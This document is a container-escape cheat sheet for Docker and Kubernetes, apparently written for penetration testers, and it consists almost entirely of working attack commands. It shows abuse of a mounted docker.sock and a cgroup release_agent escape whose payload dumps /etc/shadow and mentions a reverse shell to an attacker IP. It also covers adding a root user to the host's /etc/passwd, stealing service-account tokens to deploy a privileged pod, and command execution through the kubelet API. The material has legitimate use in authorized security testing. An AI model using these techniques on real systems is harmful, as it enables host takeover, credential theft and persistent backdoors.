# Container Escape Reference (T1611)

## Container Detection

### Am I in a Container?
```bash
# Docker indicators
ls -la /.dockerenv 2>/dev/null && echo "DOCKER"
cat /proc/1/cgroup 2>/dev/null | grep -qi docker && echo "DOCKER"
cat /proc/1/cgroup 2>/dev/null | grep -qi kubepods && echo "KUBERNETES"

# General container indicators
cat /proc/1/cgroup 2>/dev/null | grep -qiE "docker|lxc|kubepods|containerd" && echo "CONTAINER"

# Hostname check (random hex = likely container)
hostname  # e.g., a1b2c3d4e5f6

# Limited PID namespace
ls /proc/ | grep -c "^[0-9]"  # Very few processes = likely container

# Check environment
env | grep -iE "kubernetes|docker|container"
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE "kube|docker"

# Kubernetes service account
ls -la /var/run/secrets/kubernetes.io/ 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
```

### Container Enumeration
```bash
# What capabilities do we have?
capsh --print 2>/dev/null
cat /proc/1/status | grep -i cap
# Decode: capsh --decode=<hex_value>

# Available devices
ls -la /dev/
fdisk -l 2>/dev/null

# Mounted filesystems
mount
cat /proc/mounts
df -h

# Network namespace
ip a
ip route
cat /etc/hosts
cat /etc/resolv.conf

# What can we see on the host?
ls -la /host/ 2>/dev/null
ls -la /mnt/ 2>/dev/null
```

---

## Docker Socket Escape

### Detection
```bash
ls -la /var/run/docker.sock
# If exists and readable → full host escape possible
```

### Exploitation
```bash
# Method 1: Docker CLI (if available)
docker images
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Now you're root on the host

# Method 2: Docker CLI — mount and access
docker run -v /:/host --rm -it alpine sh
cat /host/etc/shadow
echo 'hacker:$1$salt$...:0:0:root:/root:/bin/bash' >> /host/etc/passwd

# Method 3: curl (no Docker CLI)
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool

# Create container with host mount
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}' \
  http://localhost/containers/create?name=pwned

# Start it
curl -s --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/pwned/start

# Exec into it
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["/bin/sh"],"Tty":true}' \
  http://localhost/containers/pwned/exec

# Method 4: nsenter (if PID 1 of host is accessible)
# Find host PID namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

---

## Privileged Container Escape

### Detection
```bash
# Quick test — can we add network interfaces?
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link delete dummy0 || echo "unprivileged"

# Check capabilities
capsh --print 2>/dev/null | grep -i "current"
# If cap_sys_admin is present → privileged or nearly so

# Check seccomp
cat /proc/1/status | grep Seccomp
# 0 = disabled (privileged), 2 = filter mode (default)
```

### Exploitation — cgroup release_agent
```bash
# Classic privileged container escape
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release

# Get host path to container filesystem
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Create payload on container filesystem (visible to host via host_path)
cat > /cmd << 'EOF'
#!/bin/sh
cat /etc/shadow > /output
# Or: /bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
EOF
chmod a+x /cmd

# Trigger — create process in cgroup then exit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Read output
cat /output
```

### Exploitation — Mount Host Filesystem
```bash
# If privileged — can see host block devices
fdisk -l
# Find host root partition (e.g., /dev/sda1)

mkdir /mnt/host
mount /dev/sda1 /mnt/host
# Full host filesystem access
cat /mnt/host/etc/shadow
chroot /mnt/host /bin/bash
```

### Exploitation — nsenter from Privileged
```bash
# If we can see host PID namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

---

## cap_sys_admin Escape (Non-Privileged but Dangerous)

```bash
# cap_sys_admin allows mounting filesystems
# Same technique as privileged — mount host devices
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
chroot /tmp/hostfs /bin/bash

# Or use cgroup escape technique above
```

---

## Kubernetes-Specific Escapes

### Service Account Token Abuse
```bash
# Read service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Query API server
APISERVER=https://kubernetes.default.svc

# Check permissions (can-i)
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'

# List pods
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# If we can create pods — create privileged pod
cat > pwn-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: pwn
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
      type: Directory
  nodeSelector:
    kubernetes.io/hostname: <target_node>
EOF

curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  -X POST -H "Content-Type: application/yaml" \
  --data-binary @pwn-pod.yaml \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods
```

### Kubelet API (Port 10250)
```bash
# If kubelet API is exposed and unauthenticated
curl -sk https://<node_ip>:10250/pods
curl -sk https://<node_ip>:10250/run/<namespace>/<pod>/<container> -d "cmd=id"
```

---

## Container Escape Checklist

```
1. [ ] Detect container type (Docker/K8s/LXC)
2. [ ] Check docker.sock availability
3. [ ] Check privileged mode (ip link add test)
4. [ ] Enumerate capabilities (capsh --print)
5. [ ] Check mounted host paths (/host, /mnt)
6. [ ] Check Kubernetes service account
7. [ ] Check for host PID namespace sharing
8. [ ] Check available block devices (fdisk -l)
9. [ ] Check seccomp profile (Seccomp: 0 = good)
10. [ ] Try cgroup release_agent if cap_sys_admin
```

## Escape Priority
```
1. Docker socket mounted        → Instant root on host
2. Privileged container          → cgroup escape / mount host
3. cap_sys_admin                 → Mount host / cgroup escape
4. Host PID namespace            → nsenter to host
5. K8s SA with pod create        → Deploy privileged pod
6. Mounted host paths            → Direct host access
7. Kubelet API exposed           → Command execution on node
```
